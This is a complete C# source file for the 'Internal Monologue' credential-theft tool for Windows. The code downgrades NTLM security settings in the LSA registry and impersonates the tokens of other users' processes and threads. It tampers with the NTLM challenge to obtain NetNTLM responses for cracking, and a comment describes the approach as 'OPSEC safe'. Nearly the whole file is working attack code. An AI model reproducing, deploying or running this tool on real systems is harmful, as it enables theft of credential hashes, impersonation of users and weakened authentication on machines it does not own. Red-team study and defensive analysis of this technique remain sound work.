using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace InternalMonologue
{
    public class InternalMonologue
    {
        public InternalMonologue() { }
        public InternalMonologue(bool impersonate = true, bool threads = false, bool downgrade = true, bool restore = true, string challenge = "1122334455667788", bool verbose = false)
        {
            this.impersonate = impersonate;
            this.threads = threads;
            this.downgrade = downgrade;
            this.restore = restore;
            this.challenge = challenge;
            this.verbose = verbose;
        }

        bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false, isElevated = false;
        string challenge = "1122334455667788";

        const int MAX_TOKEN_SIZE = 12288;

        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public SID_AND_ATTRIBUTES[] Groups;
        };

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr PAuthenticationID,
            IntPtr pAuthData,
            int pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            ref SecBufferDesc SecBufferDesc,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", SetLastError = true)]
        static extern int AcceptSecurityContext(ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            ref SecBufferDesc pInput,
            uint fContextReq,
            uint TargetDataRep,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsTimeStamp);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            int dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            int ImpersonationLevel,
            int dwTokenType,
            ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,
            IntPtr dwThreadId);

        private void GetRegKey(string key, string name, out object result)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
            if (Lsa != null)
            {
                object value = Lsa.GetValue(name);
                if (value != null)
                {
                    result = value;
                    return;
                }
            }
            result = null;
        }

        private void SetRegKey(string key, string name, object value)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
            if (Lsa != null)
            {
                if (value == null)
                {
                    Lsa.DeleteValue(name);
                }
                else
                {
                    Lsa.SetValue(name, value);
                }
            }
        }

        private void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }

        private void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
        }

        //Retrieves the SID of a given token
        public string GetLogonId(IntPtr token)
        {
            string SID = null;
            try
            {
                StringBuilder sb = new StringBuilder();
                int TokenInfLength = 1024;
                IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                Boolean Result = GetTokenInformation(token, 1, TokenInformation, TokenInfLength, out TokenInfLength);
                if (Result)
                {
                    TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

                    IntPtr pstr = IntPtr.Zero;
                    Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                    SID = Marshal.PtrToStringAuto(pstr);
                    LocalFree(pstr);
                }

                Marshal.FreeHGlobal(TokenInformation);

                return SID;
            }
            catch
            {
                CloseHandle(token);
                return null;
            }
        }

        public bool ValidateSID(string SID, bool verbose)
        {
            if (SID.IsNullOrWhiteSpace())
            {
                return false;
            }

            if (authenticatedUsers.Contains(SID) == true)
            {
                //Check if the user has been handled previously
                return false;
            }
            if (SID == "S-1-5-18" || SID == "S-1-5-19" || SID == "S-1-5-20" || SID == "S-1-5-96-0-0" || SID == "S-1-5-96-0-1" || SID == "S-1-5-90-0-1")
            {
                //do not touch processes owned by system, local service, network service, font driver host, or window manager
                return false;
            }
            return true; //Check if the SID is OPSEC safe
        }

        public InternalMonologueConsole HandleProcess(Process process, string challenge, bool verbose)
        {
            var console = new InternalMonologueConsole();
            try
            {
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                string SID = null;

                if (OpenProcessToken(process.Handle, 0x0008, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);
                    if (!ValidateSID(SID, verbose))
                    {
                        return null;
                    }

                    if (verbose) console.AddConsole(string.Format("{0} {1}\n", SID, process.ProcessName));
                    if (OpenProcessToken(process.Handle, 0x0002, ref token))
                    {
                        var sa = new SECURITY_ATTRIBUTES();
                        sa.nLength = Marshal.SizeOf(sa);

                        DuplicateTokenEx(
                            token,
                            0x0002 | 0x0008,
                            ref sa,
                            (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                            (int)1,
                            ref dupToken);

                        CloseHandle(token);

                        try
                        {
                            using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                            {
                                if (verbose == true) console.AddConsole(string.Format("Impersonated user {0}\n", WindowsIdentity.GetCurrent().Name));
                                var result = InternalMonologueForCurrentUser(challenge, true);
                                //Ensure it is a valid response and not blank
                                if (!result.Resp1.IsNullOrWhiteSpace())
                                {
                                    console.AddResponse(result);
                                    console.AddConsole(string.Format("{0}\n", result.ToString()));
                                    authenticatedUsers.Add(SID);
                                }
                                else if (verbose == true) { console.AddConsole(string.Format("Got blank response for user {0}\n", WindowsIdentity.GetCurrent().Name)); }
                            }
                        }
                        catch
                        { /*Does not need to do anything if it fails*/ }
                        finally
                        {
                            CloseHandle(dupToken);
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
            return console;
        }

        public InternalMonologueConsole HandleThread(ProcessThread thread, string challenge, bool verbose)
        {
            var console = new InternalMonologueConsole();
            try
            {
                var token = IntPtr.Zero;
                string SID = null;

                //Try to get thread handle
                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));

                //If failed, return
                if (handle == IntPtr.Zero)
                {
                    return null;
                }

                if (OpenThreadToken(handle, 0x0008, true, ref token))
                {
                    //Get the SID of the token
                    SID = GetLogonId(token);
                    CloseHandle(token);
                    if (!ValidateSID(SID, verbose))
                    {
                        return null;
                    }

                    if (OpenThreadToken(handle, 0x0002, true, ref token))
                    {
                        var sa = new SECURITY_ATTRIBUTES();
                        sa.nLength = Marshal.SizeOf(sa);
                        var dupToken = IntPtr.Zero;

                        DuplicateTokenEx(
                            token,
                            0x0002 | 0x0008,
                            ref sa,
                            (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                            (int)1,
                            ref dupToken);

                        CloseHandle(token);

                        try
                        {
                            using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                            {
                                if (verbose == true) console.AddConsole(string.Format("Impersonated user {0}\n", WindowsIdentity.GetCurrent().Name));
                                var result = InternalMonologueForCurrentUser(challenge, true);
                                //Ensure it is a valid response and not blank
                                if (!result.Resp1.IsNullOrWhiteSpace())
                                {
                                    console.AddResponse(result); //rich data object for consumer classes
                                    console.AddConsole(string.Format("{0}\n", result));
                                    authenticatedUsers.Add(SID);
                                }
                                else if (verbose == true) { console.AddConsole(string.Format("Got blank response for user {0}\n", WindowsIdentity.GetCurrent().Name)); }
                            }
                        }
                        catch
                        { /*Does not need to do anything if it fails*/ }
                        finally
                        {
                            CloseHandle(dupToken);
                        }
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
            return console;
        }

        //Maintains a list of handled users
        private List<string> authenticatedUsers = new List<string>();


        public InternalMonologueConsole Go()
        {
            var console = new InternalMonologueConsole();
            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
            isElevated = IsElevated();
            if (isElevated)
            {
                if (verbose == true) console.AddConsole("Running elevated\n");
                object oldValue_LMCompatibilityLevel = null;
                object oldValue_NtlmMinClientSec = null;
                object oldValue_RestrictSendingNTLMTraffic = null;
                if (downgrade == true)
                {
                    if (verbose == true) console.AddConsole("Performing NTLM Downgrade\n");
                    //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
                    ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
                }

                if (impersonate == true)
                {
                    if (verbose == true) console.AddConsole("Starting impersonation\n");
                    foreach (Process process in Process.GetProcesses())
                    {
                        var response = HandleProcess(process, challenge, verbose);
                        if (response != null)
                        {
                            console.AddConsole(string.Format("{0}\n", response.Output()));
                            console.AddResponses(response.Responses);
                        }
                        if (!threads)
                        {
                            continue;
                        }
                        foreach (ProcessThread thread in process.Threads)
                        {
                            response = HandleThread(thread, challenge, verbose);
                            if (response == null)
                            {
                                continue;
                            }
                            console.AddConsole(string.Format("{0}\n", response.Output()));
                            console.AddResponses(response.Responses);
                        }
                    }
                }
                else
                {
                    if (verbose == true) console.AddConsole("Performing attack on current user only (no impersonation)\n");
                    var response = InternalMonologueForCurrentUser(challenge, true);
                    console.AddResponse(response);
                    console.AddConsole(string.Format("{0}\n", response.ToString()));
                }

                if (downgrade == true && restore == true)
                {
                    if (verbose == true) console.AddConsole("Restoring NTLM values\n");
                    //Undo changes made in the Extended NetNTLM Downgrade
                    NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
                }
            }
            else
            {
                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                if (verbose == true) console.AddConsole("Not elevated. Performing attack with current NTLM settings on current user\n");
                var response = InternalMonologueForCurrentUser(challenge, true);
                console.AddResponse(response);
                console.AddConsole(string.Format("{0}\n", response.ToString()));
            }
#if DEBUG
            Console.WriteLine(console.Output());
#endif
            return console;
        }

        //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
        private InternalMonologueResponse InternalMonologueForCurrentUser(string challenge, bool DisableESS)
        {
            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            SecBufferDesc ServerToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE _hCred;
            _hCred.LowPart = _hCred.HighPart = IntPtr.Zero;
            SECURITY_INTEGER ClientLifeTime;
            ClientLifeTime.LowPart = 0;
            ClientLifeTime.HighPart = 0;
            SECURITY_HANDLE _hClientContext;
            SECURITY_HANDLE _hServerContext;
            uint ContextAttributes = 0;

            // Acquire credentials handle for current user
            AcquireCredentialsHandle(
                WindowsIdentity.GetCurrent().Name,
                "NTLM",
                3,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref _hCred,
                ref ClientLifeTime
                );

            // Get a type-1 message from NTLM SSP
            InitializeSecurityContext(
                ref _hCred,
                IntPtr.Zero,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                IntPtr.Zero,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );

            // Get a type-2 message from NTLM SSP (Server)
            AcceptSecurityContext(
                ref _hCred,
                IntPtr.Zero,
                ref ClientToken,
                0x00000800,
                0x10,
                out _hServerContext,
                out ServerToken,
                out ContextAttributes,
                out ClientLifeTime
                );

            // Tamper with the CHALLENGE message
            byte[] serverMessage = ServerToken.GetSecBufferByteArray();
            byte[] challengeBytes = StringToByteArray(challenge);
            if (DisableESS)
            {
                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
            }
            //Replace Challenge
            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
            //Reset reserved bytes to avoid local authentication
            Array.Copy(new byte[16], 0, serverMessage, 32, 16);

            ServerToken = new SecBufferDesc(serverMessage);

            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            int resCode = InitializeSecurityContext(
                ref _hCred,
                ref _hClientContext,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                ref ServerToken,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );

            //If failed, retry without disabling ESS
            if (resCode != 0 && DisableESS)
            {
                ClientToken.Dispose();
                ServerToken.Dispose();

                return InternalMonologueForCurrentUser(challenge, false);
            }

            byte[] result = ClientToken.GetSecBufferByteArray();

            ClientToken.Dispose();
            ServerToken.Dispose();

            //Extract the NetNTLM response from a type-3 message and return it
            return ParseNTResponse(result, challenge);
        }

        //This function parses the NetNTLM response from a type-3 message
        private InternalMonologueResponse ParseNTResponse(byte[] message, string challenge)
        {
            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
            ushort domain_len = BitConverter.ToUInt16(message, 28);
            uint domain_off = BitConverter.ToUInt32(message, 32);
            ushort user_len = BitConverter.ToUInt16(message, 36);
            uint user_off = BitConverter.ToUInt32(message, 40);
            byte[] lm_resp = new byte[lm_resp_len];
            byte[] nt_resp = new byte[nt_resp_len];
            byte[] domain = new byte[domain_len];
            byte[] user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);

            var result = new InternalMonologueResponse();
            result.NtlmDowngrade = downgrade;
            result.FromElevated = isElevated;
            result.Challenge = challenge;
            result.ImpersonatedIdentity = WindowsIdentity.GetCurrent().Name;
            result.SID = WindowsIdentity.GetCurrent().User.ToString();
            if (nt_resp_len == 24)
            {
                result.UserName = ConvertHex(ByteArrayToString(user));
                result.Domain = ConvertHex(ByteArrayToString(domain));
                result.Resp1 = ByteArrayToString(lm_resp);
                result.Resp2 = ByteArrayToString(nt_resp);
//                result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + ByteArrayToString(lm_resp) + ":" + ByteArrayToString(nt_resp) + ":" + challenge;
            }
            else if (nt_resp_len > 24)
            {
                result.UserName = ConvertHex(ByteArrayToString(user));
                result.Domain = ConvertHex(ByteArrayToString(domain));
                result.Resp1 = ByteArrayToString(nt_resp).Substring(0, 32);
                result.Resp2 = ByteArrayToString(nt_resp).Substring(32);
                //result = ConvertHex(ByteArrayToString(user)) + "::" + ConvertHex(ByteArrayToString(domain)) + ":" + challenge + ":" + ByteArrayToString(nt_resp).Substring(0, 32) + ":" + ByteArrayToString(nt_resp).Substring(32);
            }

            return result;
        }

        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        //This function is taken from https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        private static bool IsElevated()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            if (hex.Length % 2 == 1)
                return null;

            byte[] arr = new byte[hex.Length >> 1];

            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static int GetHexVal(char hex)
        {
            int val = (int)hex;
            return val - (val < 58 ? 48 : 55);
        }

        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
        public static string ConvertHex(String hexString)
        {
            string ascii = string.Empty;

            for (int i = 0; i < hexString.Length; i += 2)
            {
                String hs = string.Empty;

                hs = hexString.Substring(i, 2);
                if (hs == "00")
                    continue;
                uint decval = System.Convert.ToUInt32(hs, 16);
                char character = System.Convert.ToChar(decval);
                ascii += character;

            }

            return ascii;
        }
    }

    struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;

        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public SecBuffer(byte[] secBufferBytes, int bufferType)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)bufferType;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

    struct SecBufferDesc : IDisposable
    {
        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }

                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;

            if (pBuffers == IntPtr.Zero)
            {
                throw new InvalidOperationException("Object has already been disposed!!!");
            }

            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));

                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;

                for (int Index = 0; Index < cBuffers; Index++)
                {
                    //calculate the total number of bytes we need to copy...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }

                Buffer = new byte[BytesToAllocate];

                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    //Now iterate over the individual buffers and put them together into a byte array...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }

            return (Buffer);
        }
    }

    struct SECURITY_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    };

    struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;

    };

    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }
}
